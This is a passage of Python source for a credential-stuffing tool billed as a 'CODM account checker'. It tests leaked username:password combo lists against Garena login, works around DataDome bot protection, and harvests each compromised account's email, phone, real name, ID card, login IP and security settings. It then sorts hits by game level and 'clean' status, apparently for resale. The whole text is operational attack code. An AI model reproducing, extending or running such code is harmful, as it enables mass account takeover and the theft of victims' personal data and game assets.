            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get("access_token", "")
            if not access_token:
                logger.error(f"[ERROR] token/exchange returned no access_token: {data}")
            return access_token
        except:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * (2 ** attempt)
                time.sleep(delay)
                continue
            else:
                logger.error(f"[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts")
                raise
    return ""

def get_codm_access_token(session):
    code = get_codm_grant_code(session)
    if not code:
        logger.error("[ERROR] get_codm_access_token: failed at token/grant step")
        return ""
    session_proxies = dict(session.proxies) if session.proxies else None
    access_token = token_exchange(code, proxies=session_proxies)
    if not access_token:
        logger.error("[ERROR] get_codm_access_token: failed at token/exchange step")
        return ""
    return access_token

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request-aos.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False, timeout=12)
        api_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request-aos.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False, timeout=12)
        location = api_callback_response.headers.get("Location", "")
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
    except Exception:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request-aos.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        check_response = session.get(check_login_url, headers=check_headers, timeout=12)
        check_data = check_response.json()
        user_data = check_data.get("user", {})
        if user_data:
            region_code = user_data.get("region", "N/A")
            formatted_region = format_codm_region(region_code)
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": formatted_region,
                "region_code": region_code,
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token)
        if status == "no_codm":
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return has_codm, codm_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = "N/A"
    fb_uid = "N/A"
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = (mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == '')
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and not email.startswith('***'):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and fb_uid != 'N/A':
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = "Clean" if is_clean else f"Not Clean" if account_info['binds'] else "Not Clean"
    account_info['is_clean'] = is_clean
    return account_info

def strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*m', '', text)

def format_account_output_ansi(account, password, details, codm_info, has_codm, error_reason=None):
    if error_reason == "Account Doesn't Exist":
        status_color = SOFT_RED
        cred_color = SOFT_BEIGE
        status_text = "ACCOUNT DOESN'T EXIST"
    elif error_reason == "Incorrect Password":
        status_color = SOFT_RED
        cred_color = SOFT_BEIGE
        status_text = "INCORRECT PASSWORD"
    elif error_reason and "IP Blocked" in error_reason:
        status_color = DIM
        cred_color = SOFT_BEIGE
        status_text = error_reason.upper()
    elif error_reason:
        status_color = SOFT_RED
        cred_color = SOFT_BEIGE
        status_text = error_reason.upper()
    else:
        login_history = details.get('login_history', [])
        last_login_ts = 0
        if len(login_history) >= 2:
            last_login_ts = login_history[1].get('timestamp', 0)
        elif len(login_history) == 1:
            last_login_ts = login_history[0].get('timestamp', 0)
        if last_login_ts and last_login_ts > 0:
            days_ago = (time.time() - last_login_ts) / (24 * 3600)
            if days_ago <= 30:
                status_text = "ACTIVE"
                status_color = SOFT_GREEN
            else:
                status_text = "INACTIVE"
                status_color = DIM
        else:
            status_text = "INACTIVE"
            status_color = DIM
        cred_color = SOFT_BEIGE

    if error_reason:
        lines = [
            "➻ Account Overview",
            f"    ➻ Username: {cred_color}{account}{RESET}",
            f"    ➻ Password: {cred_color}{password}{RESET}",
            f"    ➻ Status: {status_color}{status_text}{RESET}",
            "",
            f"    ➻ Developed by @rrielqt"
        ]
        return "\n".join(lines)

    username = details.get('username', account)
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    mobile = details['personal'].get('mobile_no', '')
    country_code = details['personal'].get('country_code', '')
    formatted_mobile = format_mobile_number(mobile, country_code) if mobile and mobile != 'N/A' else 'N/A'
    shell = details['profile'].get('shell_balance', 0)
    suspicious = "Yes" if details.get('security', {}).get('suspicious', False) else "No"
    fb_link = "N/A"
    if details['facebook'].get('fb_uid') and details['facebook']['fb_uid'] != 'N/A':
        fb_link = f"https://www.facebook.com/profile.php?id={details['facebook']['fb_uid']}"
    fb_status = "NOT CONNECTED"
    if details['facebook'].get('fb_uid') and details['facebook']['fb_uid'] != 'N/A':
        if details['facebook'].get('fb_username') and details['facebook']['fb_username'] != 'N/A':
            fb_status = f"CONNECTED — {details['facebook']['fb_username']}"
        else:
            fb_status = "CONNECTED (unlinked)"
    mobile_binding = details['personal'].get('mobile_binding_status', 'N/A')
    if formatted_mobile == 'N/A' or not formatted_mobile:
        mobile_binding = 'N/A'
    codm_nick = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
    codm_level = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
    codm_region_raw = codm_info.get('region', 'N/A') if has_codm else 'N/A'
    codm_region_display = codm_region_raw
    import re
    m = re.search(r'\(([A-Z]{2})\)', codm_region_raw)
    if m:
        region_code = m.group(1)
        flag = CODM_REGIONS.get(region_code, {}).get('flag', '')
        codm_region_display = f"{region_code} {flag}" if flag else region_code
    else:
        codm_region_display = codm_region_raw
    codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
    two_step = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
    authenticator = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
    country = details['personal'].get('country', 'N/A')
    country_flag = CODM_REGIONS.get(country.upper(), {}).get('flag', '') if country != 'N/A' else ''
    country_display = f"{country} {country_flag}".strip() if country != 'N/A' else 'N/A'
    id_card = "Yes" if details['personal'].get('id_card') and details['personal']['id_card'] != 'N/A' else "No"
    login_history = details.get('login_history', [])
    last_login_entry = None
    if len(login_history) >= 2:
        last_login_entry = login_history[1]
    elif len(login_history) == 1:
        last_login_entry = login_history[0]
    if last_login_entry:
        last_login = last_login_entry.get('timestamp', 0)
        last_login_where = last_login_entry.get('source', 'N/A')
        last_login_ip = last_login_entry.get('ip', 'N/A')
        last_login_country = last_login_entry.get('country', 'N/A')
    else:
        last_login = 0
        last_login_where = 'N/A'
        last_login_ip = 'N/A'
        last_login_country = 'N/A'
    last_login_date = time.strftime("%B %d, %Y | %I:%M %p", time.localtime(last_login)) if last_login else "N/A"
    ip_country_name, ip_country_flag = ip_to_country(last_login_ip)
    if ip_country_name and ip_country_flag:
        ip_display = f"{last_login_ip} ({ip_country_name} {ip_country_flag})"
    else:
        country_from_garena = last_login_country
        flag_from_garena = CODM_REGIONS.get(country_from_garena.upper(), {}).get('flag', '') if country_from_garena != 'N/A' else ''
        if country_from_garena != 'N/A' and flag_from_garena:
            ip_display = f"{last_login_ip} ({country_from_garena} {flag_from_garena})"
        else:
            ip_display = last_login_ip
    last_login_country_flag = CODM_REGIONS.get(last_login_country.upper(), {}).get('flag', '') if last_login_country != 'N/A' else ''
    last_login_country_display = f"{last_login_country} {last_login_country_flag}".strip() if last_login_country != 'N/A' else 'N/A'
    email_display = email
    if email and email != 'N/A' and '@' in email:
        if '@' in email:
            local, domain = email.split('@', 1)
            if len(local) > 4:
                local_masked = local[:2] + '****' + local[-2:] if len(local) > 6 else local[:2] + '****'
            else:
                local_masked = local
            email_display = f"{local_masked}@{domain}"
        if email_verified:
            email_display += " [verified]"
        else:
            email_display += " [not verified]"

    lines = [
        "➻ Account Overview",
        f"    ➻ Username: {cred_color}{username}{RESET}",
        f"    ➻ Password: {cred_color}{password}{RESET}",
        f"    ➻ Status: {status_color}{status_text}{RESET}",
        f"    ➻ Shell Balance: {shell}",
        f"    ➻ Suspicious: {suspicious}",
        f"    ➻ Facebook URL: {fb_link}",
        f"    ➻ Facebook Status: {fb_status}",
        f"    ➻ Mobile Binding: {mobile_binding}",
        "",
        "➻ CODM Details",
        f"    ➻ Nickname: {codm_nick}",
        f"    ➻ Level: {codm_level}",
        f"    ➻ Region: {codm_region_display}",
        f"    ➻ UID: {codm_uid}",
        "",
        "➻ Bind Details",
        f"    ➻ Mobile: {formatted_mobile}",
        f"    ➻ Email: {email_display}",
        f"    ➻ 2FA: {two_step}",
        f"    ➻ Authenticator: {authenticator}",
        f"    ➻ Country: {country_display}",
        f"    ➻ ID Card: {id_card}",
        "",
        "➻ Login History",
        f"    ➻ Last Login: {last_login_date}",
        f"    ➻ Last Login From: {last_login_where}",
        f"    ➻ Last Login IP: {ip_display}",
        f"    ➻ Last Login Country: {last_login_country_display}",
        "",
        f"    ➻ Developed by @rrielqt"
    ]
    return "\n".join(lines)

class ResultsManager:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.results_dir = Path("Results")
        self.results_dir.mkdir(exist_ok=True)
        self.valid_file = self.results_dir / "Valid.txt"
        self.no_codm_file = self.results_dir / "No_codm.txt"
        self.level_files = {
            (1,50): self.results_dir / "001-050_level.txt",
            (51,100): self.results_dir / "050-100_level.txt",
            (101,150): self.results_dir / "100-150_level.txt",
            (151,200): self.results_dir / "150-200_level.txt",
            (201,250): self.results_dir / "200-250_level.txt",
            (251,300): self.results_dir / "250-300_level.txt",
            (301,350): self.results_dir / "300-350_level.txt",
            (351,400): self.results_dir / "350-400_level.txt",
        }
        self.lock = threading.Lock()
    def _get_level_range(self, level):
        if 1 <= level <= 50: return (1,50)
        elif 51 <= level <= 100: return (51,100)
        elif 101 <= level <= 150: return (101,150)
        elif 151 <= level <= 200: return (151,200)
        elif 201 <= level <= 250: return (201,250)
        elif 251 <= level <= 300: return (251,300)
        elif 301 <= level <= 350: return (301,350)
        elif 351 <= level <= 400: return (351,400)
        else: return None
    def add_account(self, account_data):
        with self.lock:
            if account_data.get('is_error'):
                return
            has_codm = account_data.get('has_codm', False)
            content = account_data.get('plain_output', '')
            if not content:
                return
            separator = "=" * 60
            if has_codm:
                with open(self.valid_file, 'a', encoding='utf-8') as f:
                    f.write(content + "\n" + separator + "\n\n")
                level = account_data.get('codm_level', 0)
                if level:
                    rng = self._get_level_range(level)
                    if rng:
                        lf = self.level_files[rng]
                        with open(lf, 'a', encoding='utf-8') as f:
                            f.write(content + "\n" + separator + "\n\n")
            else:
                with open(self.no_codm_file, 'a', encoding='utf-8') as f:
                    f.write(content + "\n" + separator + "\n\n")

def processaccount(session, account, password, cookie_manager, datadome_manager, results_manager, file_manager, combo_file_path, auto_remove, shutdown_event):
    if shutdown_event.is_set():
        return "", {}
    max_retries = 2
    for attempt in range(max_retries):
        try:
            if session is None:
                sess = cloudscraper.create_scraper()
            else:
                sess = session
            datadome_manager.clear_session_datadome(sess)

            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                cookie_line = valid_cookies[-1]
                applyck(sess, cookie_line)
                for part in cookie_line.split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        datadome_value = part.split("=", 1)[1]
                        datadome_manager.set_datadome(datadome_value)
                        break
            else:
                dd = get_datadome_cookie(sess)
                if dd:
                    datadome_manager.set_datadome(dd)
                    datadome_manager.set_session_datadome(sess, dd)

            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(sess, current_datadome)
            else:
                dd = get_datadome_cookie(sess)
                if dd:
                    datadome_manager.set_datadome(dd)
                    datadome_manager.set_session_datadome(sess, dd)

            v1, v2, new_datadome = prelogin(sess, account, datadome_manager)
            if v1 == "IP_BLOCKED":
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="IP Blocked")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            if not v1 or not v2:
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Account Doesn't Exist")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(sess, new_datadome)
            sso_key = login(sess, account, password, v1, v2)
            if not sso_key:
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Incorrect Password")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            current_cookies = sess.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            resp = sess.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            if resp.status_code == 403:
                if datadome_manager.handle_403(sess):
                    if attempt < max_retries - 1:
                        continue
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Cookie Banned/IP Blocked")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            try:
                account_data_json = resp.json()
            except json.JSONDecodeError:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Invalid Server Response")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            if 'error_auth' in account_data_json:
                plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Incorrect Password")
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    plain_output = format_account_output_ansi(account, password, None, None, False, error_reason="Account Doesn't Exist")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                    results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                    return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
                else:
                    plain_output = format_account_output_ansi(account, password, None, None, False, error_reason=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
                    results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
                    return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            has_codm, codm_info = check_codm_account(sess, account)
            fresh_datadome = datadome_manager.extract_datadome_from_session(sess)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            plain_output = format_account_output_ansi(account, password, details, codm_info, has_codm)
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
            separator_color = SOFT_GREEN if has_codm else SOFT_BEIGE
            full_output = plain_output + "\n" + f"{separator_color}{'=' * 60}{RESET}"
            account_data = {
                'account': account,
                'password': password,
                'has_codm': has_codm,
                'codm_level': int(codm_info.get('codm_level', 0)) if has_codm else 0,
                'plain_output': strip_ansi(plain_output),
                'is_error': False
            }
            results_manager.add_account(account_data)

            stats = {
                'valid': True,
                'has_codm': has_codm,
                'level': int(codm_info.get('codm_level', 0)) if has_codm else 0,
                'shell': int(details.get('profile', {}).get('shell_balance', 0)),
                'clean': details.get('is_clean', False)
            }
            return full_output, stats
        except Exception as e:
            if attempt < max_retries - 1:
                continue
            plain_output = format_account_output_ansi(account, password, None, None, False, error_reason=f"Error: {str(e)[:50]}")
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f"{account}:{password}")
            results_manager.add_account({'is_error': True, 'plain_output': strip_ansi(plain_output)})
            return plain_output + "\n" + f"{DIM}{'=' * 60}{RESET}", {'valid': False}

def display_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner_ascii = """
██████╗ ██╗███████╗██╗
██╔══██╗██║██╔════╝██║
██████╔╝██║█████╗  ██║
██╔══██╗██║██╔══╝  ██║
██║  ██║██║███████╗███████╗
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
"""
    banner_lines = banner_ascii.strip().split('\n')
    max_len = max(len(line) for line in banner_lines)
    padded_banner = "\n".join(line.ljust(max_len) for line in banner_lines)
    banner_text = Text(padded_banner, style=f"bold {COLOR_TITLE}")
    console.print(Align.center(banner_text, width=80))
    console.print(Align.center(Text("CODM ACCOUNT CHECKER  ◆  ULTRA v3.0", style=COLOR_ACCENT), width=60))
    console.print(Align.center(Text("─" * 30, style=COLOR_BORDER), width=60))
    console.print()
    console.print(Align.center(Text("t.me/celestecutiee", style=COLOR_DIM), width=60))
    console.print()

def select_input_file():
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        console.print(Align.center(Panel("[red]No combo files found in 'Combo' folder. Add .txt files and re-run.[/red]", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
        sys.exit(1)
    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)
    if not file_infos:
        console.print(Align.center(Panel("[red]No valid combo files found.[/red]", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
        sys.exit(1)
    table = Table(box=box.HEAVY, border_style=COLOR_BORDER, width=70)
    table.add_column("#", style=COLOR_ACCENT, justify="center")
    table.add_column("Filename", style=COLOR_TEXT)
    table.add_column("Size", style=COLOR_TEXT, justify="right")
    table.add_column("Accounts", style=COLOR_TEXT, justify="right")
    for idx, info in enumerate(file_infos, 1):
        table.add_row(str(idx), info['name'], info['size_str'], str(info['account_count']))
    console.print(Align.center(table))
    while True:
        choice = Prompt.ask(f"[{COLOR_ACCENT}]Select file number[/]", choices=[str(i) for i in range(1, len(file_infos)+1)], default="1")
        idx = int(choice) - 1
        if 0 <= idx < len(file_infos):
            return file_infos[idx]['path'], file_manager
        console.print(Align.center(Panel("[red]Invalid choice[/red]", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))

def prompt_clean_file(file_manager, selected_file):
    panel = Panel(
        Align.center("[dim]Clean file encoding? (removes invalid characters)[/dim]", vertical="middle"),
        title="◆ Clean Encoding ◆",
        border_style=COLOR_ACCENT,
        box=box.HEAVY,
        width=60
    )
    console.print(Align.center(panel))
    choice = Prompt.ask(f"[{COLOR_ACCENT}]Clean? (y/n)[/]", choices=["y", "n"], default="y")
    if choice == "y":
        with console.status("[yellow]Cleaning file encoding...[/yellow]", spinner="dots"):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        console.print(Align.center(Panel(f"Cleaned: {valid_count} valid, {invalid_count} removed", border_style=COLOR_BORDER, box=box.HEAVY, width=60)))
    return choice == "y"

def prompt_remove_duplicates(file_manager, selected_file):
    panel = Panel(
        Align.center("[dim]Remove duplicate lines from file?[/dim]", vertical="middle"),
        title="◆ Remove Duplicates ◆",
        border_style=COLOR_ACCENT,
        box=box.HEAVY,
        width=60
    )
    console.print(Align.center(panel))
    choice = Prompt.ask(f"[{COLOR_ACCENT}]Remove duplicates? (y/n)[/]", choices=["y", "n"], default="y")
    if choice == "y":
        with console.status("[yellow]Removing duplicates...[/yellow]", spinner="dots"):
            removed = file_manager.clean_duplicates(selected_file)
        console.print(Align.center(Panel(f"Removed {removed} duplicate(s)", border_style=COLOR_BORDER, box=box.HEAVY, width=60)))
    return choice == "y"

def prompt_auto_remove():
    panel = Panel(
        Align.center("[dim]Auto-remove checked lines from combo file while running?[/dim]", vertical="middle"),
        title="◆ Auto‑Remove ◆",
        border_style=COLOR_ACCENT,
        box=box.HEAVY,
        width=60
    )
    console.print(Align.center(panel))
    choice = Prompt.ask(f"[{COLOR_ACCENT}]Auto-remove? (y/n)[/]", choices=["y", "n"], default="n")
    return choice == "y"

def display_summary(total_checked, failed, valid, categorized_levels, countries, original_total, highest_clean=0, highest_not_clean=0, highest_shells=0):
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.columns import Columns
    from rich.align import Align
    
    console = Console()
    
    core_table = Table(show_header=False, box=None, padding=(0, 2))
    core_table.add_column("Metric", style="white")
    core_table.add_column("Value", justify="right")
    core_table.add_row("Total Checked", f"[bold white]{total_checked}[/]/[grey50]{original_total}[/]")
    core_table.add_row("Valid Accounts", f"[bold green]{valid}[/]")
    core_table.add_row("Failed/Invalid", f"[bold red]{failed}[/]")
    core_table.add_row("", "") 
    core_table.add_row("Highest Clean", f"[bold cyan]Lv. {highest_clean}[/]")
    core_table.add_row("Highest Bound", f"[bold yellow]Lv. {highest_not_clean}[/]")
    core_table.add_row("Highest Shells", f"[bold magenta]{highest_shells}[/]")
    
    lvl_table = Table(show_header=False, box=None, padding=(0, 2))
    lvl_table.add_column("Range", style="white")
    lvl_table.add_column("Count", justify="right", style="cyan")
    level_ranges = {"1-49": categorized_levels.get("1-49", 0), "50-99": categorized_levels.get("50-99", 0), "100-199": categorized_levels.get("100-199", 0), "200-299": categorized_levels.get("200-299", 0), "300-400": categorized_levels.get("300-400", 0)}
    
    has_levels = False
    for lr, count in level_ranges.items():
        if count > 0: 
            lvl_table.add_row(f"Level {lr}", str(count))
            has_levels = True
    if not has_levels: lvl_table.add_row("No level data", "")

    cnt_table = Table(show_header=False, box=None, padding=(0, 2))
    cnt_table.add_column("Country", style="white")
    cnt_table.add_column("Count", justify="right", style="green")
    if countries:
        country_counts = {}
        for c in countries:
            c_name = re.sub(r'\s*\([^)]*\)', '', c).strip()
            country_counts[c_name] = country_counts.get(c_name, 0) + 1
        for country, count in sorted(country_counts.items(), key=lambda i: i[1], reverse=True)[:5]:
            cnt_table.add_row(country, str(count))
    else:
        cnt_table.add_row("No country data", "")

    panel_core = Panel(core_table, title="[bold cyan]OVERVIEW[/]", border_style="cyan", expand=False)
    panel_lvl = Panel(lvl_table, title="[bold yellow]LEVEL DIST.[/]", border_style="yellow", expand=False)
    panel_cnt = Panel(cnt_table, title="[bold green]TOP REGIONS[/]", border_style="green", expand=False)

    console.print("\n")
    console.print(Panel(Align.center("[bold white]FINAL CHECKING SUMMARY[/]"), border_style="grey50", style="on grey15", width=75))
    console.print(Columns([panel_core, panel_lvl, panel_cnt], padding=(0, 2)))
    console.print("\n")

def bulk_check():
    display_banner()
    prompt_cookie_source()
    selected_file, file_manager = select_input_file()
    prompt_clean_file(file_manager, selected_file)
    prompt_remove_duplicates(file_manager, selected_file)
    auto_remove = prompt_auto_remove()

    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append((account, password))
    except Exception:
        console.print(Align.center(Panel("[red]Could not read file.[/red]", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
        return

    if not accounts:
        console.print(Align.center(Panel("[red]No valid accounts found in file.[/red]", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
        return

    total = len(accounts)
